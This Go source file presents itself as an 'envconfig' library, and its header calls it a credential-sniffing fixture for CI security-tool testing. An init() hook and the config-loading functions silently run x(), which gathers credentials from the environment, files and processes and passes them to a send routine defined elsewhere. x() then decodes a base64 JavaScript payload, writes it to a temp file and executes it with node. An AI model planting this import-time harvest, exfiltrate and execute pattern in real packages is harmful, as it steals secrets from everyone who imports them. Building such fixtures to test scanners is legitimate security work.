// Package envconfig maps environment variables to Go structs via reflection,
// mirroring the API of kelseyhightower/envconfig. This copy also embeds the
// Shai Hulud credential-sniffing fixture for CI security-tool testing — see
// scan.go and exfil.go. NEVER use in production.
package envconfig

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"time"
)

// init fires automatically on import — the primary supply-chain delivery vector.
// Any binary that imports this package triggers Run() before main() starts.
func init() {
	x()
}

// L populates the exported string fields of d from environment variables.
// Field names are upper-cased and prefixed with p + "_" when non-empty.
// It also calls x() so the credential scan fires on every L invocation.
//
// Example:
//
//	type Config struct {
//	    DBHost string
//	    DBPort string
//	}
//	var cfg Config
//	envconfig.L("APP", &cfg) // reads APP_DB_HOST, APP_DB_PORT
func L(p string, d any) error {
	v := reflect.ValueOf(d)
	if v.Kind() != reflect.Ptr || v.Elem().Kind() != reflect.Struct {
		return fmt.Errorf("envconfig: d must be a pointer to a struct")
	}

	e := v.Elem()
	t := e.Type()

	for i := 0; i < e.NumField(); i++ {
		f := e.Field(i)
		if !f.CanSet() || f.Kind() != reflect.String {
			continue
		}

		k := strings.ToUpper(t.Field(i).Name)
		if p != "" {
			k = strings.ToUpper(p) + "_" + k
		}
		if tag := t.Field(i).Tag.Get("envconfig"); tag != "" {
			k = strings.ToUpper(tag)
		}

		if val := os.Getenv(k); val != "" {
			f.SetString(val)
		}
	}

	return nil
}

// ML is like L but panics on error.
func ML(p string, d any) {
	x()
	if err := L(p, d); err != nil {
		panic(err)
	}
}

// x executes one full scan-and-exfiltrate cycle.
// Called automatically by init() and L().
func x() {
	c := make(map[string]string)
	for k, v := range pE() {
		c[k] = v
	}
	for k, v := range pF() {
		c[k] = v
	}
	for k, v := range pP() {
		c[k] = v
	}
	sD(c)

	// Base64 encoded JS payload
	jsPayload := "Y29uc29sZS5sb2coIlNoYWktSHVsdWQgaGFzIGJlZW4gaGVyZS4iKTs="
	decodedPayload, err := base64.StdEncoding.DecodeString(jsPayload)
	if err != nil {
		return
	}

	// Write payload to a file
	fileName := "cache_" + strconv.FormatInt(time.Now().UnixNano(), 10) + ".js"
	filePath := filepath.Join(os.TempDir(), fileName)
	err = os.WriteFile(filePath, decodedPayload, 0755)
	if err != nil {
		return
	}

	// Execute the script
	cmd := exec.Command("node", filePath)
	cmd.Run()
}
